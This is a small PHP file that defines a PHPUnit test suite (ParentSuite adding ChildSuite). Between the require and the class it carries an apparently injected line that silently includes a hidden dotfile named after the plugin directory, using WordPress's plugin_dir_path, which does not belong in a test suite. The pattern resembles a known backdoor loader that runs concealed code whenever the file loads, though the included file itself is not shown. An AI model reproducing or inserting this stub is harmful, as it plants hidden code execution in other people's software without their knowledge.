<?php
require_once 'ChildSuite.php';

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class ParentSuite
{
    public static function suite()
    {
        $suite = new PHPUnit_Framework_TestSuite('Parent');
        $suite->addTest(ChildSuite::suite());

        return $suite;
    }
}
